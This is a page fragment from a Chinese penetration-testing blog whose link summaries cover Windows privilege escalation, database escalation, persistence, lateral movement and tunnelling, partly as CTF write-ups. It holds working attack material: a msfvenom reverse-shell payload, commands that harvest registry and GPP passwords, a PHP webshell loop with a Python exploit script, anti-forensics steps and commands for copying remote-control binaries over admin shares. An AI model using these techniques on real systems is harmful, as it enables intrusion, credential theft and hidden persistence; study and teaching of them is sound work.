reg query HKCU /f password /t REG_SZ /s &amp;amp;gt;temp.txt 正常情况下，每次登陆服务器都需要输入密码，但有些管理员为了方便，可能会设置自动登录，注册表中会保存自动登录的账号和密码，所以可以尝试命令获取自动登录密码：
">windows密码操作</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-bypass-uac/" class="article-link" data-summary="windows提权-Bypass UAC 大多数应用程序都是以中级别完整性运行的，包括本地管理员会话，但如果选择“以管理员身份”运行，可以从中级别完整性提升到高级别，但这个过程会有UAC对话框弹出：
用户账户控制（User Accou Control），一种安全机制，开启后，每个需要使用到管理员访问令牌的应用都需要征得管理员同意
UAC限制的用户：除Administrator（RID 500）的所有用户（包括非RID 500的管理员）
非RID 500管理员用户登录后，系统会为其创建两个单独的访问令牌：
标准访问令牌 管理员访问令牌 管理员正常启动不执行管理任务的应用就是使用的标准访问令牌，当要执行高权限管理任务就需要使用管理员访问令牌，就会触发UAC弹窗
而Bypass UAC，实际上就是绕过上面所说的安全机制，使非RID 500的管理员账户可以直接调用管理员访问令牌来获取全部管理员权限，这仅仅是绕过了保护机制，不是真正意义上的提权（和linux的rbash逃逸的感觉相似）
UAC白名单 微软在UAC中为一部分系统程序设置了白名单，白名单中的程序能够用静默的方式自动提升到管理员权限运行，比如rundll32.exe、explorer.exe
可以通过微软官方提供的工具Sigcheck和Strings来寻找白名单程序，白名单程序的Mainifest数据中autoElivate属性值为true，检测工具大多也是检测这个属性
我们可以通过对这些白名单程序进行DLL劫持、DLL注入、注册表劫持，实现Bypass UAC
DLL劫持 和我linux提权文章中写的so共享库劫持原理相似
程序启动时DLL的加载顺序如下:
1.程序所在目录 2.程序加载目录（SetCurrentDirectory） 3.系统目录即 SYSTEM32 目录 4.16位系统目录即 SYSTEM 目录 5.Windows目录 6.PATH环境变量中列出的目录 PS：Windows操作系统通过“DLL路径搜索目录顺序”和“Know DLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能
我只需要将同名恶意dll的位置放在合法dll的搜索目录之前，加载的时候就实现了劫持
模拟可信任目录 程序请求自动提升权限的条件：
文件Manitest中autoElevate属性的值为True
检查文件的签名
文件是否位于系统可信任目录中
系统在检查可信任目录时，相关函数会自动去掉可执行文件路径中的空格。如果可执行文件位于“C:\windows \system32”目录（在windows后有一个空格，下文统称“模拟可信任目录”）中，系统在检查时会自动去除路径中的空格，这样就通过了最后一个条件的检查
那么根据可信任目录来创建一个包含尾随空格的模拟可信任目录，将一个白名单程序复制到模拟可信任目录中，配合DLL劫持等技术即可成功绕过UAC
比如：
md &amp;amp;#34;\\?\c:\windows &amp;amp;#34; md &amp;amp;#34;\\?\c:\windows \System32&amp;amp;#34; copy c:\windows\system32\winSAT.exe &amp;amp;#34;\\?\c:\windows \System32\winSAT.exe&amp;amp;#34; 接下来可以编写一个恶意的dll文件并将其放入该目录进行dll劫持，注意构造的dll需要与原来的dll具有相同的导出函数
相关工具 UACME hfiref0x/UACME: Defeating Windows User Account Control
集成了n种bypass UAC方法，具体使用看readme吧
msf msf也集成了几个绕过模块，在bypass之后，执行getsystem可以直接提升至system权限
">windows提权-Bypass UAC</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9/" class="article-link" data-summary="Windows提权-不安全的注册表项 注册表是windows系统的数据库，系统、用户配置和系统组件等信息全部存储在注册表中
注册表启动项AutoRun AlwaysInstallElevated 注册表键AlwaysInstallElevated是一个策略设置项。windows允许低权限用户以System权限运行安装文件。如果启用此策略设置项，那么任何权限用户都能以NT AUTHORITY\SYSTEM权限来安装恶意的MSI(Microsoft Installer)文件
MSI文件是微软格式的应用程序安装包，实际上是一个数据库，包含安装和卸载时需要使用的大量指令和程序数据
环境准备 以admin权限配置：
win&#43;r，gpedit.msc打开组策略管理器，找到始终以提升的权限进行安装：
计算机配置--&amp;amp;gt;管理模板--&amp;amp;gt;Windows 组件--&amp;amp;gt;Windows Installer 编辑“始终以提升的权限进行安装”为开启：
同样在用户配置中也要配置：
再在计算机配置中设置普通程序的安装可行性：
如果未成功，还可以用命令修改下：
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f 再验证一下配置是否成功：
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 提权实验 msf 先用MSF获取apache用户的会话：
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.111.128 LPORT=7890 -f exe -o payload.exe 当前shell权限为apache
使用注册表命令或使用winpeas查询到启用了AlwaysInstallElevated策略：
">Windows提权-不安全的注册表项</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E6%93%8D%E4%BD%9C/" class="article-link" data-summary="windows提权-用户凭据操作 枚举Unattended凭据 无人值守（Unattended）安装允许应用程序在不需要管理员关注的情况下自动安装
但这样会导致系统中残留一些配置文件，其中可能包含本地管理员的用户名和密码，常见路径：
C:\sysprep.inf C:\syspreg\sysprep.xml C:\Windows\system32\sysprep.inf C:\windows\system32\sysprep\sysprep.xml C:\unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Unattended.xml C:\Windows\Panther\Unattend\Unattended.xml C:\Windows\Panther\Unattend\Unattend.xml C:\Windows\System32\Sysprep\Unattend.xml C:\Windows\System32\Sysprep\Panther\Unattend.xml 我们可以全盘搜索这些文件
dir /b /s c:\unattend.xml 当然，msf提供了enum_unattend模块，可以从unattend配置文件中自动化检索用户密码
获取组策略凭据 SYSVOL 是活动目录里的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控之间进行复制，SYSVOL 在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录域范围内共享，所有的域策略均存放在 C:\Windows\SYSVOL\DOMAIN\Policies\ 目录中。
管理员在域中新建一个组策略后，系统会自动在 SYSVOL 目录中生成一个 XML 文件
该文件中保存了该组策略更新后的密码，该密码使用 AES-256 算法，但 2012 年微软公布了该密码的私钥，也就是说任何人都可以对其进行解密
在目录中搜索即可：
findstr /s /i &amp;amp;#34;cpassword&amp;amp;#34; C:\Windows\SYSVOL\*.xml 然后找到cpassword的值解密
Gpprefdecrypt.py 下载地址：https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py
python2.7 Gpprefdecrypt.py Wdkeu1drbxqPJm7YAtPtwBtyzcqO88hJUBDD2eseoY0 使用 **msf **的 post/windows/gather/credentials/gpp 模块也可以搜索cpassword并解密
HiveNightmare 和我之前看见的卷影拷贝获取ntds.dit原理相似，任何标准用户都可以从卷影副本中读取包括SAM、SYSTEM、SECURITY在内的多个系统文件，进而从SAM获取HTLM hash，破解后可以实现权限提升
低权限cmd检测是否存在漏洞：
icacls c:\windows\system32\config\sam 若输出结果是：BUILTIN\USERS:(I)(RX)，表明存在漏洞（RX代表[READ/EXecute权限）
">windows提权-用户凭据操作</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/" class="article-link" data-summary="Windows提权-系统服务提权 用户安装的一些软件会在本地注册一些服务，大多数服务在计算机开机时以系统system权限启动，应用软件在注册服务时会在以下路径创建对应注册表项：
计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services 其中服务的imagepath指向系统服务启动的二进制程序：
这里便产生一种提权的思路：
由于大多数系统服务是system权限启动，如果让服务启动时执行其他程序，该程序就可以随着服务的启动获得系统权限，达到提权目录
这类提权往往是用户配置不当导致的，接下来分类细说
服务配置权限脆弱 windows的系统服务通过ACL来指定用户对其拥有的权限，常见权限如下：
如果目标主机的用户在配置服务时存在疏忽，使低权限用户对高权限下运行的系统服务拥有更改服务配置的权限（SERVICE_CHANGE_CONFIG或SERVICE_ALL_ACCESS），即可通过该低权限用户修改服务启动时的二进制文件路径，通过修改服务启动文件的路径“ binpath”，将其替换为恶意程序的路径，这样服务启动时便会运行恶意程序
存在缺陷的系统服务可以通过AccessChk来枚举：
AccessChk工具可以枚举目标主机上存在权限缺陷的系统服务。AccessChk是微软官方提供的管理工具，常用来枚举或查看系统中指定用户、组对特定资源(包括但不限于文件、文件夹、注册表、全局对象和系统服务等)的访问权限
低权限用户可以检查“Authenticated Users”组和“INTERACTIVE”组对系统服务的权限，前者为经过身份验证的用户，包含系统中所有使用用户名、密码登录并通过身份验证的账户，但不包括来宾账户，后者为交互式用户组，包含系统中所有直接登录到计算机进行操作的用户，默认情况下，这两个组为计算机本地“Users”组的成员
环境准备 用admin权限配置环境：
先建一个服务，名字为Yuy0ung，运行C盘下的1.exe：
sc create Yuy0ung binpath= &amp;amp;#34;C:\1.exe&amp;amp;#34; 创建一个用户模拟apache：
net user apache Admin123456 /add 使用用subinacl（需要自己下载）给服务设置权限：
subinacl /service Yuy0ung /grant=apache=F 提权实验 切换到apche用户并用CS实现远控：
上传accesschk并枚举是否具有apache用户可更改的服务配置：
accesschk.exe /accepteula -uwcqv apache * 若得到SERVICE_ALL_ACCESS或SERVICE_CHANGE_CONFIG其中之一，则允许我们配置服务
**注：**除了accesschk，winpeas也可以枚举出可以修改的服务配置
更改Yuy0ung服务的启动文件，替换成恶意的文件（这里我选择使用上传的远控exe）然后提权：
sc config Yuy0ung binpath= &amp;amp;#34;C:\Users\apache\Desktop\artifact.exe&amp;amp;#34; # 注意=后面有个空格 手动启动服务：
sc start Yuy0ung 可以看见这里成功接收到了system权限的beacon
服务注册表权限脆弱 Windows的服务路径存储在Windows的注册表中，而注册表使用ACL来管理用户对其的访问权限，若ACL配置不当，使低权限用户可以更改注册表的选项的时候，就可以导致提权，可以将 imagepath 修改成恶意的文件，重启导致提权
环境准备 新建一个test服务：
">Windows提权-系统服务提权</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%E6%93%8D%E7%BA%B5/" class="article-link" data-summary="windows提权-访问令牌操纵 Windows访问令牌 令牌（Token）是系统的临时密钥，相当于账户名和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的，它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌持续存在系统中，除非系统重新启动
令牌最大的特点就是随机性，不可预测，一般黑客或软件无法猜测出来，令牌有很多种：
访问令牌（Access Token）表示访问控制操作主题的系统对象 会话令牌（Session Token）：是交互会话中唯一的身份标识符，可以理解为web中的token 密保令牌（Security Token）又叫作认证令牌或者硬件令牌，是一种计算机身份效验的物理设备 Windows 的访问令牌（AccessToken） 中包含如下内容
用户账户的安全标识符(SID) 用户所属的组的SID 用于标识当前登陆会话的登陆SID 用户或用户组所拥有的权限列表 所有者SID 主要组的SID 访问控制列表 访问令牌的来源 令牌是主要令牌还是模拟令牌 限制SID的可选列表 目前的模拟等级 其他统计的数据 Windows 的访问令牌（AccessToken） 有两种类型
Delegation Token：授权令牌，也叫主令牌，支持交互式会话登录 (例如本地用户直接登录、远程桌面登录访问)
Impresonation Token：模拟令牌，支持非交互的会话 (例如使用 net use访问共享文件夹)。
两种 token 只在系统重启后清除，具有 Delegation token 的用户在注销后，该 Token 将变成Impersonation token（模拟令牌），依旧有效
值得一提的是，令牌窃取只能在特权用户上下文中才能完成，因为通过令牌创建进程使用的CreateProcessWithTokenW和CreateProcessAsUserA两个windows API分别要求用户必须拥有SeImpersonatePrivilege和SeAssignPrimaryTokenPrivilege/SeIncreaseQuotaPrivilege特权，而拥有这两个特权的用户一般为系统管理员账户、网络服务账户、系统服务账户（IIS、MSSQL等）
令牌窃取 该操作往往用来将管理员权限提升至SYSTEM、TrustedInstaller等更高权限，若本地管理员因为某些组策略设置无法获取某些特权，可以通过令牌窃取来假冒NT AUTHORITY\SYSTEM的令牌
利用JCTokenUtil窃取令牌 本来想使用incognito.exe的，但是发现了一款incognito.exe二开工具JCTokenUtil，感觉更好用
首先上传工具至目标主机，执行命令获取NT AUTHORITY\SYSTEM账户的令牌：
TokenUtil_x64.exe ListTokens -u &amp;amp;#34;NT AUTHORITY\SYSTEM&amp;amp;#34; 再试试用获取到的NT AUTHORITY\SYSTEM账户令牌执行命令：
TokenUtil_x64.exe Execute -p 304 -e whoami -c 利用metasploit窃取令牌 msf同样内置了incognito框架，可以直接使用
">windows提权-访问令牌操纵</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>数据库提权</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/mysql%E6%8F%90%E6%9D%83/" class="article-link" data-summary="MySQL提权 mysql的权限提升通常可以两种：
UDF提权（常用） 写文件提权 启动项提权 mof提权 一、UDF提权 UDF 全称为user defined function，用户自定义函数
用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数
UDF提权的作用 渗透过程中，拿下一台低权限的主机shell（尤其是windows）时，有些操作无法进行，而此时本地恰好存在mysql数据库，且mysql是root权限 (windows中mysql一般都是管理员权限)，就可以通过新建管理员用户等操作实现提权即udf提权，也可以称为通过mysql获得管理员权限
动态链接库 动态链接库：是把程序代码中会使用的函数编译成机器码，保存在.dll文件中。在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用
注：在linux中对应为so文件
利用条件以及数据库版本问题 获得一个mysql数据库账号（最好是root），拥有insert、delete权限，拥有将xxx.dll写入相对应目录的权限
查看版本：
select version(); 查看secure-file-priv是否有目录限制，执行：
show global variables like &amp;amp;#34;secure%&amp;amp;#34;; 当secure_file_priv 的值为 NULL ，表示限制mysqld 不允许导入|导出，无法进行提权 当secure_file_priv 的值为 c:/ ，表示限制 mysqld 的导入|导出只能发生在c盘目录下，无法进行提权 当 secure_file_priv的值没有具体值时，表示不对 mysqld 的导入|导出做限制，可以提权 查看plugin目录是否存在：
select @@plugin_dir; #或 show variables like &amp;amp;#39;plugin%&amp;amp;#39;; udf利用的其中一步，是要将我们的xxx.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同：
版本 路径 MySQL &amp;amp;lt; 5.0 导出路径随意 5.0 &amp;amp;lt;= MySQL &amp;amp;lt; 5.1 需要导出至目标服务器的系统目录（如：C:\windows\system32\） 5.1 &amp;amp;lt; MySQL 必须导出到MySQL安装目录下的lib\plugin目录下（高版本mysql默认不存在lib\plugin目录，需要自己创建） 版本大于5.1的时候，lib\plugin文件夹的创建方法：
">MySQL提权</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/sql-server%E6%8F%90%E6%9D%83/" class="article-link" data-summary="SQL server提权 SQL server，即mssql，是微软开发的一款关系型数据库系统，常出现在windows主机上，而SQL server具有一些常规的打法（主要是用于提权），这里学习并记录
发现SQL server 本地查看 SQL server默认1433端口，所以如果在getshell后发现1433端口处于监听状态，则有可能安装了SQL server
如果端口被修改，可以通过查看进程ID来查找SQL server：
tasklist /svc | findstr MSSQLSERVER netstat -ano | findstr &amp;amp;lt;进程ID&amp;amp;gt; ">SQL server提权</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>权限维持</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/ctfshow-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="article-link" data-summary="ctfshow-权限维持 web670 这里的check貌似是删web根目录文件，那么可以用awd的常规思路，写一个不死马：
GET:?action=cmd POST:cmd=file_put_contents(&amp;amp;#39;a.php&amp;amp;#39;, &amp;amp;#39;&amp;amp;lt;?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = \&amp;amp;#39;shell.php\&amp;amp;#39;;$code = \&amp;amp;#39;&amp;amp;lt;?php @eval($_POST[1]);?&amp;amp;gt;\&amp;amp;#39;;while (1) {file_put_contents($file, $code);usleep(5000);}?&amp;amp;gt;&amp;amp;#39;); 访问不死马使其解析，将木马写入内存
然后申请check，再连接shell.php即可：
web671 同样写不死马即可，flag在根目录：
web672 同理：
web673 同理。。
既然不死马一直能打，那我们可以尝试构造一个python脚本：
import requests url=&amp;amp;#34;http://ed21030c-afd5-4efd-a3c6-d6728eef56f5.challenge.ctf.show/&amp;amp;#34; data1={&amp;amp;#39;cmd&amp;amp;#39;:&amp;amp;#34;file_put_contents(&amp;amp;#39;a.php&amp;amp;#39;,\&amp;amp;#34;&amp;amp;lt;?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);\\$file = &amp;amp;#39;shell.php&amp;amp;#39;;\\$code = &amp;amp;#39;&amp;amp;lt;?php @eval(\\$_POST[1]);?&amp;amp;gt;&amp;amp;#39;;while (1) {file_put_contents(\\$file, \\$code);usleep(5000);}?&amp;amp;gt;\&amp;amp;#34;);&amp;amp;#34;} r=requests.post(url&#43;&amp;amp;#39;?action=cmd&amp;amp;#39;,data=data1) try: requests.get(url&#43;&amp;amp;#39;a.php&amp;amp;#39;,timeout=(1,1)) except: requests.get(url&#43;&amp;amp;#39;?action=check&amp;amp;#39;) r=requests.post(url&#43;&amp;amp;#39;shell.php&amp;amp;#39;,data={&amp;amp;#39;1&amp;amp;#39;:&amp;amp;#39;system(&amp;amp;#34;cat /f*&amp;amp;#34;);&amp;amp;#39;}) print(r.text) 一跑即出：
web674-676 同理，脚本跑即可
web677 除了tmp目录都没有写权限
这里同样可以用加载进程的思维：
GET:?action=cmd POST:cmd=system(&amp;amp;#39;sleep 10;cat /f*&amp;amp;#39;); 执行后会加载十秒，在此期间，另开一个页面来启动check，即可cat到flag：
web678 check后，会停止一切web服务，包括nginx php-fpm 天地同寿的打法，你能应付吗
tmp目录可写，那么就在这个目录上做文章
中间件都没了，那就用php直接在/tmp起一个服务，就能解析tmp中的php文件了
tmp目录下生成木马文件:
cmd=system(&amp;amp;#39;cd /tmp;echo &amp;amp;#34;&amp;amp;lt;?php eval(\$_POST[1]);?&amp;amp;gt;&amp;amp;#34; &amp;amp;gt; index.php&amp;amp;#39;); 开启web服务：
">ctfshow-权限维持</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="article-link" data-summary="linux权限维持 修改文件、终端属性 文件创建时间 有时我们会根据文件修改时间来判断文件是否为后门，比如对比shell.php和index.php的修改时间是否相差过大
touch命令用于修改文件或者目录的时间属性，可以使用touch修改文件创建时间：
touch -r index.php shell.php # 将shell.php的修改时间改为和index.php一致 文件锁定 在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，而此权限用ls -l是查看不出来的，从而达到隐藏权限的目的：
chattr &#43;i evil.php #锁定文件 rm -rf evil.php #直接删除会提示禁止删除 lsattr evil.php #属性查看 chattr -i evil.php #解除锁定 rm -rf evil.php #此时才可以正常删除文件 历史操作命令 我们可能想不让在shell中执行的命令被记录在命令行历史中，但单纯的history -c 只能清除全部命令记录，可以尝试下面的方法
针对你的工作关闭历史记录 可以临时禁用历史功能，这意味着在这命令之后执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中：
[space]set &#43;o history #[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录 执行了目标命令后记得恢复：
[Space]set -o history #将环境恢复原状 可以看看下面这个情况：
上图利用这个方法使echo 2nd的命令记录没有被存储在history中
历史记录中删除指定的命令 如果目标命令已经存在于历史，可以对其进行删除：
找到想要删除的关键命令：
history | grep &amp;amp;#34;keyword&amp;amp;#34; 上面查询得到了对应命令记录的id，接下来进行删除：
history -d [num] 虽然这样删除了历史记录，但我上面执行的命令也被记录了，所以我个人认为上面关闭历史记录的方法更有效
添加用户 默认已经提升至root权限
passwd写入 root权限时，我们可以直接通过写入passwd文件进行用户写入
/etc/passwd 各部分含义：
⽤户名：密码：⽤户ID：组ID：身份描述：⽤户的家⽬录：⽤户登录后所使⽤的SHELL 可以根据这个格式增加超级用户：
首先构造一个Yuy0ung用户的身份信息：
">linux权限维持</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="article-link" data-summary="windows权限维持 最主要就是想一些办法让我们的后门能够自主执行从而让我们一直拥有目标主机的权限，很多操作也类似于权限提升
文件特性 和linux一样，文件层面上看，有一些隐藏文件的方法
attrib attrib &#43;s &#43;a &#43;h &#43;r c:\test s：设置系统属性（System） a：设置存档属性（Archive） h：设置隐藏属性（Hidden）
r：设置只读属性（Read-only）
如此即可进行隐藏
如果要查看，需要加上/a参数：
dir /a 当然，删除对应属性也能重新显示出来：
attrib -s -a -h -r c:\test 系统图标隐藏 可以把文件夹的名称重命名为 我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
这样，图标变成了我的电脑，双击也是可以到达我的电脑，不能进入查看我们文件夹的内容
此时，只能使用命令行查看和访问该文件夹：
常用的名称如下：
我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D} 回收站.{645ff040-5081-101b-9f08-00aa002f954e} 拔号网络.{992CFFA0-F557-101A-88EC-00DD010CCC48} 打印机.{2227a280-3aea-1069-a2de-08002b30309d} 控制面板.{21ec2020-3aea-1069-a2dd-08002b30309d} 网上邻居.{208D2C60-3AEA-1069-A2D7-08002B30309D} 畸形名称 创建文件名称为 test...\ 显示名称是 test...
这个文件可以看到，但是不能访问内部文件，也不能删除
md test...\ copy 1111.txt test...\ 此时这个文件显示出来的名称为test&amp;amp;hellip;
以这个名称进行文件操作始终会失败：
命令行进入失败：
直接点也点不开，或者点开后里面的文件也无法打开：
无法直接删除：
如果想要删除该文件，可以如下操作：
rd /s /q c:\test...\ /s 表示递归地删除指定目录及所有子目录中的文件。 /q 表示安静模式，即不提示确认直接删除。 ">windows权限维持</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>横向移动</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF%E5%90%88%E9%9B%86/" class="article-link" data-summary="横向移动姿势合集 横向移动姿势浅析 横向移动中的文件传输 横向移动之前，需要对攻击载荷和文件等的传输制定方案（当然，你使用c2的话当我没说）
通过网络共享 可以实现局域网之间的网络共享，通过提供有效的用户凭据，用户可以实现两台主机之间的文件传输
获取windows默认开启的网络共享：
net share C$为C盘共享，ADMIN$为系统目录共享，IPC$共享需要提供可信任的用户名和口令来建立安全的传输通道
实战通常选择IPC连接，该方法除了文件共享还能实现创建计划任务或系统服务等，而建立IPC连接的前提是：
远程主机开启了IPC连接 远程主机139或445端口开放 建立IPC连接：
net use \\192.168.111.131\IPC$ &amp;amp;#34;Admin123456&amp;amp;#34; /user:&amp;amp;#34;yuy0ung\administrator&amp;amp;#34; 列出远程主机C盘共享文件：
dir \\192.168.111.131\C$ 使用copy可以在两台主机之间相互复制文件，这里我向目标主机上传远控exe：
copy artifact.exe \\192.168.111.131\C$ 建立其他共享连接命令类似如C$连接：
net use \\192.168.111.131\C$ &amp;amp;#34;Admin123456&amp;amp;#34; /user:&amp;amp;#34;yuy0ung\Administrator&amp;amp;#34; 搭建SMB服务器 可以尝试在公网vps或受控内网主机上搭建SMB服务器，将需要传输的文件放入SMB服务器的共享目录并指定UNC路径，让横向移动的主机能够远程加载共享文件，有两点需要注意：
要使用SMB匿名共享 该SMB服务器能够被目标主机访问 在linux系统上可以通过impacket项目中的smbserver.py搭建SMB服务器
搭建一个名为yuy0ungsmb，共享目录指向/root/share的SMB匿名共享：
mkdir /root/share python smbserver.py yuy0ungsmb /root/share -smb2support # 或者 impacket-smbserver evilsmb /root/share -smb2support 从 SMB server 下载文件
copy \\192.168.111.128\yuy0ungsmb\file.exe file.exe 上传文件到 SMB server
net use x: \\192.168.111.128\yuy0ungsmb copy file.txt x: net use x: /delete 使用 windows自带工具 Certutil certutil用于管理windows证书并作为证书服务的一部分安装，其提供了从网络中下载文件的功能：
">横向移动姿势合集</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>隧道代理技术</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-%E5%9F%BA%E4%BA%8Elinux%E5%8E%9F%E7%94%9F%E5%B7%A5%E5%85%B7%E7%9A%84%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/" class="article-link" data-summary="隧道代理-基于Linux原生工具的隧道代理 文章的灵感来自于面试官的问题：“知道linux不上传任何工具怎么搭隧道代理吗”
由于平时习惯直接使用frp、venom、suo5等代理工具，或者是直接使用C2自带的代理，所以被问到的时候直接懵了，后面才发现我竟然在学习代理的时候是学过的：隧道代理-端口转发相关工具，但是当时没有上手实践所以根本没记住，特有此篇文章来记录相关操作
准备工作 我写了一个python脚本，用于在内网起一个web网页，通过是否可以访问来判断代理是否成功：
